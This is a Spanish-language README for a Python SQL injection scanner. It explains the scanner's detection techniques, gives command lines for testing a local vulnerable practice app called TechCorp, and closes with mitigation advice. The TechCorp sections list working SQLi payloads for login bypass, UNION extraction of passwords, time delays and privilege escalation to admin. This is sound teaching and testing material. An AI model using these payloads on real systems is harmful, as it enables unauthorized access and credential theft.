# SQL Injection Scanner - Herramienta Profesional de Detección

Herramienta completa de detección de vulnerabilidades SQL Injection en Python, diseñada para analizar aplicaciones web y detectar vulnerabilidades SQLi mediante múltiples técnicas de detección y Machine Learning.

## 📋 Tabla de Contenidos

- [Características](#características)
- [Instalación](#instalación)
- [Uso](#uso)
- [Arquitectura](#arquitectura)
- [Módulos](#módulos)
- [Ejemplos con TechCorp](#ejemplos-con-techcorp)
- [OWASP y Cyber Kill Chain](#owasp-y-cyber-kill-chain)
- [Recomendaciones de Mitigación](#recomendaciones-de-mitigación)
- [Troubleshooting](#troubleshooting)

## 🚀 Características

### Motor de Pruebas Automatizadas
- **60+ payloads** organizados en 5 categorías:
  - 15 payloads básicos
  - 15 payloads UNION-based
  - 10 payloads boolean-blind
  - 10 payloads time-based
  - 10 payloads error-based

### Criterios de Detección OWASP
- Detección de errores SQL mediante regex (50+ patrones)
- Análisis de time-based SQLi (umbral: 5 segundos)
- Detección boolean-blind mediante comparación de HTML
- Análisis de cambios en estructura DOM
- Detección basada en longitud de respuesta
- Evaluación multi-criterio

### Machine Learning
- Clasificador Random Forest entrenable
- Extracción automática de características
- Clasificación: Vulnerable / Potencialmente vulnerable / No vulnerable
- Guardado y carga de modelos pre-entrenados

### Compatibilidad
- Funciona con cualquier aplicación web (Flask, Django, Node.js, PHP, etc.)
- Soporte para métodos GET y POST
- Descubrimiento automático de parámetros
- Soporte para cookies y headers personalizados

### Reportes Profesionales
- Reporte en consola legible
- Reporte JSON estructurado
- Reporte HTML profesional con evidencias

## 📦 Instalación

### Requisitos
- Python 3.10 o superior
- pip (gestor de paquetes de Python)

### Pasos de Instalación

1. **Clonar o descargar el proyecto**
   ```bash
   cd AppDetecta
   ```

2. **Instalar dependencias**
   ```bash
   pip install -r requirements.txt
   ```

3. **Verificar instalación**
   ```bash
   python detector.py --help
   ```

## 🚀 Guía Rápida Paso a Paso

### Paso 1: Preparación
Asegúrate de tener Python 3.10+ instalado y las dependencias instaladas:
```bash
pip install -r requirements.txt
```

### Paso 2: Escaneo Básico
Para un escaneo básico de una aplicación web:
```bash
python detector.py --url http://localhost:5000
```
Esto escaneará la URL raíz con payloads básicos usando GET.

### Paso 3: Escaneo de Endpoint Específico
Para escanear un endpoint específico (ej: login):
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST
```

### Paso 4: Escaneo Completo con Reporte
Para un escaneo completo con reporte HTML:
```bash
python detector.py --url http://localhost:5000 --attack all --method BOTH --report reporte.html --verbose
```
**Nota:** Usa `--verbose` para ver información detallada durante el escaneo, incluyendo indicios de vulnerabilidades.

### Paso 5: Revisar Resultados
1. Revisa la salida en consola para ver vulnerabilidades detectadas
2. Abre el archivo `reporte.html` en tu navegador para ver el reporte detallado
3. Si se generó JSON, puedes procesarlo programáticamente

### Paso 6: Usar Machine Learning (Opcional)
Para usar clasificación ML:
```bash
# Primero entrenar el modelo
python detector.py --url http://localhost:5000 --train-ml

# Luego usar el modelo entrenado
python detector.py --url http://localhost:5000 --ml --ml-model sql_injection_model.pkl
```

## 🎯 Comandos Completos para Probar TechCorp

> **Nota:** Estos comandos están basados en la estructura real de TechCorp. Los parámetros han sido identificados según la documentación de la aplicación vulnerable.

### Vulnerabilidad 1: `/login` - Boolean-Blind SQL Injection

**Parámetros:** `username`, `password`

**Sin verbose:**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST --payload-set boolean_blind --params "username,password" --report login_scan.html
```

**Con verbose (recomendado):**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST --payload-set boolean_blind --params "username,password" --report login_scan.html --verbose
```

**Con todos los payloads:**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST --attack all --params "username,password" --report login_scan.html --verbose
```

**Payloads de ejemplo que funcionan:**
- Usuario: `admin'--` (bypass de autenticación)
- Usuario: `admin' AND 1=1--` (boolean true)
- Usuario: `admin' AND 1=2--` (boolean false)

---

### Vulnerabilidad 2: `/buscar_empleado` - UNION-based y Error-based SQL Injection

**Parámetros:** `id` (UNION-based) y `nombre` (Error-based)

**UNION-based - Búsqueda por ID (GET):**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --payload-set union --params "id,username,password,email" --report empleados_union_scan.html --verbose
```

**Error-based - Búsqueda por Nombre (GET):**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --payload-set error_based --params "nombre,username" --report empleados_error_scan.html --verbose
```

**Ambos tipos (UNION + Error) - Todos los parámetros:**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --attack all --params "id,username,password,email" --report empleados_full_scan.html --verbose
```

**Sin especificar parámetros (descubrimiento automático):**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --attack all --report empleados_scan.html --verbose
```

**Payloads de ejemplo que funcionan:**
- ID: `1 UNION SELECT id,username,password,email FROM users--`
- ID: `-1 UNION SELECT id,username,password,email FROM users--`
- Nombre: `admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--`

---

### Vulnerabilidad 3: `/productos` - Time-based SQL Injection

**Parámetro:** `categoria`

**Sin verbose:**
```bash
python detector.py --url http://localhost:5000 --endpoint /productos --method GET --payload-set time_based --params "categoria" --timeout 15 --report productos_scan.html
```

**Con verbose (recomendado):**
```bash
python detector.py --url http://localhost:5000 --endpoint /productos --method GET --payload-set time_based --params "categoria" --timeout 15 --report productos_scan.html --verbose
```

**Con timeout aumentado (recomendado para time-based):**
```bash
python detector.py --url http://localhost:5000 --endpoint /productos --method GET --payload-set time_based --params "categoria" --timeout 20 --aggressive --report productos_scan.html --verbose
```

**Con todos los payloads:**
```bash
python detector.py --url http://localhost:5000 --endpoint /productos --method GET --attack all --params "categoria" --timeout 20 --report productos_scan.html --verbose
```

**Payloads de ejemplo que funcionan:**
- Categoría: `electronics' AND (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3)>0--`

---

### Vulnerabilidad 4: `/perfil` - UPDATE SQL Injection

**Parámetros:** `user_id`, `bio`

**Sin verbose:**
```bash
python detector.py --url http://localhost:5000 --endpoint /perfil --method POST --attack all --params "user_id,bio" --report perfil_scan.html
```

**Con verbose (recomendado):**
```bash
python detector.py --url http://localhost:5000 --endpoint /perfil --method POST --attack all --params "user_id,bio" --report perfil_scan.html --verbose
```

**Con payloads básicos (recomendado para UPDATE):**
```bash
python detector.py --url http://localhost:5000 --endpoint /perfil --method POST --payload-set basic --params "user_id,bio" --report perfil_scan.html --verbose
```

**Payloads de ejemplo que funcionan:**
- Bio: `hacked', role='admin`
- Bio: `pwned', password='nuevapass', role='admin`

---

### Vulnerabilidad 5: `/registro` - Second-Order SQL Injection

**Parámetros:** `username`, `email`

**Sin verbose:**
```bash
python detector.py --url http://localhost:5000 --endpoint /registro --method POST --attack all --params "username,email" --report registro_scan.html
```

**Con verbose (recomendado):**
```bash
python detector.py --url http://localhost:5000 --endpoint /registro --method POST --attack all --params "username,email" --report registro_scan.html --verbose
```

**Con payloads básicos:**
```bash
python detector.py --url http://localhost:5000 --endpoint /registro --method POST --payload-set basic --params "username,email" --report registro_scan.html --verbose
```

**Payloads de ejemplo que funcionan:**
- Usuario: `admin'--`
- Usuario: `hacker' OR '1'='1`

---

### Escaneo Completo de Todos los Endpoints

**Sin verbose:**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --endpoint /buscar_empleado --endpoint /productos --endpoint /perfil --endpoint /registro --method BOTH --attack all --report techcorp_full_scan.html --json techcorp_full_scan.json
```

**Con verbose (recomendado):**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --endpoint /buscar_empleado --endpoint /productos --endpoint /perfil --endpoint /registro --method BOTH --attack all --report techcorp_full_scan.html --json techcorp_full_scan.json --verbose
```

**Nota:** Para un escaneo completo más efectivo, es mejor probar cada endpoint por separado con sus parámetros específicos, ya que cada uno tiene diferentes parámetros vulnerables.

---

### Comandos Rápidos por Tipo de Vulnerabilidad

**Solo boolean-blind (Login):**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST --payload-set boolean_blind --params "username,password" --verbose
```

**Solo UNION-based (Buscar Empleado - ID):**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --payload-set union --params "id" --verbose
```

**Solo time-based (Productos):**
```bash
python detector.py --url http://localhost:5000 --endpoint /productos --method GET --payload-set time_based --params "categoria" --timeout 20 --verbose
```

**Solo error-based (Buscar Empleado - Nombre):**
```bash
python detector.py --url http://localhost:5000 --endpoint /buscar_empleado --method GET --payload-set error_based --params "nombre" --verbose
```

**Todos los payloads (recomendado para descubrimiento):**
```bash
python detector.py --url http://localhost:5000 --endpoint /login --method POST --attack all --params "username,password" --verbose
```

---

**💡 Consejos importantes:**
1. **Siempre usa `--verbose`** para ver detalles de cada prueba y entender qué está pasando
2. **Especifica parámetros** con `--params` usando los nombres exactos de TechCorp (ver arriba)
3. **Revisa el reporte HTML** generado para ver evidencias detalladas
4. **Para time-based**, aumenta el timeout con `--timeout 20` o usa `--aggressive`
5. **Prueba endpoints uno por uno** primero, luego haz el escaneo completo
6. **Para `/buscar_empleado`**, prueba ambos parámetros (`id` y `nombre`) por separado
7. **Activa el Modo Debug** en TechCorp para ver las queries SQL ejecutadas

**📋 Parámetros específicos de TechCorp:**
- `/login`: `username`, `password`
- `/buscar_empleado`: `id` (UNION), `nombre` (Error-based)
- `/productos`: `categoria`
- `/perfil`: `user_id`, `bio`
- `/registro`: `username`, `email`

## 🎯 Uso

### Uso Básico

```bash
# Escanear una URL básica
python detector.py --url http://localhost:5000

# Escanear endpoint específico
python detector.py --url http://localhost:5000 --endpoint /login

# Escanear múltiples endpoints
python detector.py --url http://localhost:5000 --endpoint /login --endpoint /productos --endpoint /perfil
```

### Modos de Ataque

```bash
# Modo básico (solo payloads básicos)
python detector.py --url http://localhost:5000 --attack basic

# Modo agresivo (todos los payloads, timeouts aumentados)
python detector.py --url http://localhost:5000 --attack aggressive --aggressive

# Modo ML (con clasificador de Machine Learning)
python detector.py --url http://localhost:5000 --attack ml --ml

# Modo recon (reconocimiento rápido)
python detector.py --url http://localhost:5000 --attack recon

# Modo completo (todos los payloads)
python detector.py --url http://localhost:5000 --attack all
```

### Métodos HTTP

```bash
# Solo GET (por defecto)
python detector.py --url http://localhost:5000 --method GET

# Solo POST
python detector.py --url http://localhost:5000 --method POST

# Ambos métodos
python detector.py --url http://localhost:5000 --method BOTH
```

### Conjuntos de Payloads

```bash
# Todos los payloads (por defecto)
python detector.py --url http://localhost:5000 --payload-set all

# Solo payloads básicos
python detector.py --url http://localhost:5000 --payload-set basic

# Solo UNION-based
python detector.py --url http://localhost:5000 --payload-set union

# Solo time-based
python detector.py --url http://localhost:5000 --payload-set time_based
```

### Machine Learning

```bash
# Usar modelo ML pre-entrenado
python detector.py --url http://localhost:5000 --ml --ml-model sql_injection_model.pkl

# Entrenar modelo con resultados del escaneo
python detector.py --url http://localhost:5000 --train-ml

# Usar ML sin modelo (requiere entrenamiento previo)
python detector.py --url http://localhost:5000 --ml
```

### Configuración Avanzada

```bash
# Con cookies de sesión
python detector.py --url http://localhost:5000 --cookies '{"session":"abc123","token":"xyz789"}'

# Con headers personalizados
python detector.py --url http://localhost:5000 --headers '{"X-API-Key":"secret123"}'

# Timeout personalizado
python detector.py --url http://localhost:5000 --timeout 20

# Parámetros específicos
python detector.py --url http://localhost:5000 --params "username,password,email"

# Verificar SSL
python detector.py --url https://example.com --verify-ssl
```

### Generación de Reportes

```bash
# Reporte HTML
python detector.py --url http://localhost:5000 --report reporte.html

# Reporte JSON
python detector.py --url http://localhost:5000 --json reporte.json

# Ambos reportes
python detector.py --url http://localhost:5000 --report reporte.html --json reporte.json

# Modo verbose
python detector.py --url http://localhost:5000 --verbose
```

### Ejemplos Completos

```bash
# Escaneo completo con ML y reporte HTML
python detector.py --url http://localhost:5000 \
    --attack all \
    --method BOTH \
    --ml \
    --report scan_report.html \
    --verbose

# Escaneo agresivo de endpoint específico
python detector.py --url http://192.168.1.10:5000 \
    --endpoint /login \
    --method POST \
    --attack aggressive \
    --aggressive \
    --timeout 30 \
    --cookies '{"session":"abc123"}'

# Reconocimiento rápido
python detector.py --url http://target.com \
    --attack recon \
    --method GET \
    --timeout 5
```

## 🏗️ Arquitectura

La herramienta está diseñada con una arquitectura modular:

```
AppDetecta/
├── detector.py          # Punto de entrada principal
├── cli.py               # Interfaz de línea de comandos
├── payloads.py          # Gestión de payloads (60 payloads)
├── scanner.py           # Motor de ataque automatizado
├── sqli_detector.py     # Criterios de detección OWASP
├── ml_classifier.py     # Clasificador de Machine Learning
├── reporter.py          # Generador de reportes
├── requirements.txt     # Dependencias
└── README.md           # Documentación
```

### Flujo de Ejecución

1. **CLI** (`cli.py`): Parsea argumentos y configura la herramienta
2. **Payloads** (`payloads.py`): Carga payloads según modo seleccionado
3. **Scanner** (`scanner.py`): Envía requests con payloads inyectados
4. **Detector** (`sqli_detector.py`): Analiza respuestas usando criterios OWASP
5. **ML Classifier** (`ml_classifier.py`): Clasifica con Machine Learning (opcional)
6. **Reporter** (`reporter.py`): Genera reportes en múltiples formatos

## 📚 Módulos

### 1. payloads.py - Gestión de Payloads

Contiene exactamente 60 payloads organizados en 5 categorías:

- **basic**: Payloads básicos de inyección SQL
- **union**: Payloads UNION-based para extracción de datos
- **boolean_blind**: Payloads para SQLi boolean-blind
- **time_based**: Payloads que causan retrasos temporales
- **error_based**: Payloads que generan errores SQL

**Funciones principales:**
- `get_all_payloads()`: Retorna todos los payloads
- `get_payloads_by_type(type)`: Retorna payloads de un tipo específico
- `get_payload_count()`: Retorna el número total de payloads

### 2. scanner.py - Motor de Ataque

Realiza el envío automatizado de payloads y recopila respuestas.

**Características:**
- Soporte GET y POST
- Descubrimiento automático de parámetros
- Medición de tiempos de respuesta
- Captura de códigos HTTP y longitudes
- Manejo de cookies y headers

**Clase principal:** `SQLInjectionScanner`

### 3. sqli_detector.py - Detección OWASP

Implementa criterios formales de detección según OWASP.

**Criterios implementados:**
- **Error-based**: Detección de 50+ patrones de error SQL
- **Time-based**: Umbral de 5 segundos para retrasos
- **Boolean-blind**: Comparación de cambios en HTML/DOM
- **Length-based**: Análisis de diferencias en longitud
- **UNION-based**: Detección de cambios en contenido

**Clase principal:** `SQLInjectionDetector` (en `sqli_detector.py`)

### 4. ml_classifier.py - Machine Learning

Sistema de clasificación supervisado para detectar vulnerabilidades.

**Características:**
- Extracción automática de 13 características
- Modelo Random Forest (configurable)
- Entrenamiento con datos de escaneo
- Guardado y carga de modelos
- Clasificación con probabilidades

**Clase principal:** `SQLInjectionMLClassifier`

**Características extraídas:**
1. Tiempo de respuesta
2. Código de estado HTTP
3. Longitud de respuesta
4. Diferencia con respuesta base
5. Presencia de errores SQL
6. Similitud HTML
7. Cambios en DOM
8. Ratio de diferencia de longitud
9-13. Tipo de payload (one-hot encoding)

### 5. reporter.py - Generación de Reportes

Genera reportes en múltiples formatos.

**Formatos soportados:**
- Consola: Salida legible en terminal
- JSON: Estructurado para procesamiento automático
- HTML: Reporte visual profesional con evidencias

**Clase principal:** `ReportGenerator`

### 6. cli.py - Interfaz de Línea de Comandos

Maneja todos los argumentos y opciones de la herramienta.

**Argumentos principales:**
- `--url`: URL objetivo (obligatorio)
- `--endpoint`: Endpoints específicos
- `--method`: Método HTTP (GET/POST/BOTH)
- `--attack`: Modo de ataque
- `--ml`: Habilitar Machine Learning
- `--report`: Generar reporte HTML
- `--json`: Generar reporte JSON


## 🔒 OWASP y Cyber Kill Chain

### Relación con OWASP Top 10

#### A03:2021 – Injection
La herramienta detecta específicamente vulnerabilidades de inyección SQL, que es el tipo más común de inyección. Los criterios de detección están alineados con las recomendaciones OWASP para identificar y prevenir inyecciones SQL.

**Criterios implementados:**
- Detección de errores SQL (error-based)
- Análisis de tiempos de respuesta (time-based)
- Comparación de respuestas (boolean-blind)
- Detección de cambios en estructura (UNION-based)

#### A05:2021 – Security Misconfiguration
La herramienta puede identificar configuraciones inseguras que permiten la exposición de información de error, facilitando la explotación de SQLi.

### Cyber Kill Chain

La herramienta se relaciona con las siguientes fases de la Cyber Kill Chain:

#### 1. Reconnaissance (Reconocimiento)
- **Herramienta**: Descubrimiento automático de parámetros
- **Modo**: `--attack recon` para reconocimiento rápido
- **Función**: Identifica endpoints y parámetros vulnerables

#### 2. Weaponization (Armamento)
- **Herramienta**: Carga de 60 payloads organizados
- **Función**: `payloads.py` proporciona el arsenal de payloads
- **Adaptación**: Payloads adaptados según el tipo de aplicación detectada

#### 3. Delivery (Entrega)
- **Herramienta**: Envío automatizado de requests
- **Función**: `scanner.py` realiza la entrega de payloads
- **Métodos**: GET, POST, con cookies y headers personalizados

#### 4. Exploitation (Explotación)
- **Herramienta**: Detección de evidencias de explotación
- **Función**: `detector.py` identifica si el payload fue exitoso
- **Evidencias**: Errores SQL, retrasos, cambios en HTML

#### 5. Installation (Instalación)
- **No aplica directamente**: SQLi no instala malware
- **Documentación**: Se documenta cómo la explotación exitosa podría llevar a instalación de backdoors mediante comandos SQL

#### 6. Command & Control (C2)
- **No aplica directamente**: SQLi no establece C2 tradicional
- **Documentación**: Se explica cómo SQLi puede usarse para establecer comunicación con bases de datos comprometidas

#### 7. Actions on Objectives (Acciones sobre Objetivos)
- **Herramienta**: Detección de extracción de datos
- **Función**: Identifica UNION-based SQLi que permite extracción
- **Evidencia**: Cambios en contenido que indican datos extraídos

## 🛡️ Recomendaciones de Mitigación

### 1. Uso de Consultas Preparadas (Prepared Statements)

**Problema:** Las consultas SQL construidas mediante concatenación de strings son vulnerables.

**Solución:**
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"

# ✅ SEGURO
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

### 2. Uso de ORM (Object-Relational Mapping)

**Problema:** El acceso directo a SQL puede ser propenso a errores.

**Solución:**
```python
# ❌ VULNERABLE
User.query.filter(f"username = '{username}'").first()

# ✅ SEGURO (SQLAlchemy)
User.query.filter(User.username == username).first()
```

### 3. Validación y Sanitización de Entrada

**Recomendaciones:**
- Validar tipo de datos esperado
- Limitar longitud de entrada
- Usar whitelist en lugar de blacklist
- Escapar caracteres especiales cuando sea necesario

### 4. Principio de Menor Privilegio

**Recomendaciones:**
- Usar cuentas de base de datos con permisos mínimos
- No usar cuentas de administrador para operaciones normales
- Separar permisos de lectura y escritura

### 5. Manejo Seguro de Errores

**Problema:** Los mensajes de error pueden revelar información sensible.

**Solución:**
```python
# ❌ VULNERABLE
except Exception as e:
    return f"Error: {str(e)}"  # Expone detalles SQL

# ✅ SEGURO
except Exception as e:
    logger.error(f"Database error: {e}")
    return "An error occurred. Please try again."
```

### 6. WAF (Web Application Firewall)

**Recomendaciones:**
- Implementar WAF para bloquear payloads conocidos
- Configurar reglas específicas para SQLi
- Monitorear y actualizar reglas regularmente

### 7. Testing de Seguridad

**Recomendaciones:**
- Realizar pruebas de penetración regulares
- Usar herramientas automatizadas (como esta)
- Revisar código en busca de patrones vulnerables
- Implementar pruebas unitarias de seguridad

### Comparación: Consultas Preparadas vs. Concatenación

| Aspecto | Concatenación (Vulnerable) | Prepared Statements (Seguro) |
|---------|---------------------------|-------------------------------|
| **SQLi** | ❌ Vulnerable | ✅ Protegido |
| **Rendimiento** | ⚠️ Recompila cada vez | ✅ Precompilado, más rápido |
| **Legibilidad** | ⚠️ Puede ser confuso | ✅ Más claro |
| **Mantenimiento** | ⚠️ Propenso a errores | ✅ Más fácil de mantener |

## 🔧 Troubleshooting

### Problema: "ModuleNotFoundError"

**Solución:**
```bash
pip install -r requirements.txt
```

### Problema: Timeouts frecuentes

**Solución:**
```bash
# Aumentar timeout
python detector.py --url http://target.com --timeout 30

# Modo agresivo (aumenta timeout automáticamente)
python detector.py --url http://target.com --aggressive
```

### Problema: No se detectan vulnerabilidades conocidas

**Solución:**
- Verificar que el endpoint sea accesible
- Probar con `--method BOTH` para cubrir GET y POST
- Usar `--attack all` para todos los payloads
- Verificar cookies de sesión si es necesario
- Revisar el reporte HTML para ver detalles

### Problema: Errores de SSL

**Solución:**
```bash
# Deshabilitar verificación SSL (solo para testing)
python detector.py --url https://target.com --verify-ssl
```

### Problema: Modelo ML no funciona

**Solución:**
```bash
# Entrenar modelo primero
python detector.py --url http://target.com --train-ml

# Luego usar el modelo entrenado
python detector.py --url http://target.com --ml --ml-model sql_injection_model.pkl
```

## 📝 Notas Importantes

⚠️ **ADVERTENCIA**: Esta herramienta está diseñada únicamente para pruebas de seguridad en sistemas que posees o tienes permiso explícito para probar. El uso no autorizado es ilegal.

✅ **Buenas Prácticas:**
- Siempre obtener autorización antes de escanear
- Usar en entornos de desarrollo/testing
- No usar en producción sin autorización
- Revisar y entender los resultados antes de tomar acciones

## 📄 Licencia

Este proyecto es una herramienta educativa y de seguridad. Úsalo responsablemente.

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:
1. Revisa el código existente
2. Propón mejoras o correcciones
3. Documenta cambios significativos

## 📧 Contacto

Para preguntas o problemas, revisa la documentación o crea un issue en el repositorio.

---

**Versión:** 1.0  
**Última actualización:** 2024  
**Python requerido:** 3.10+

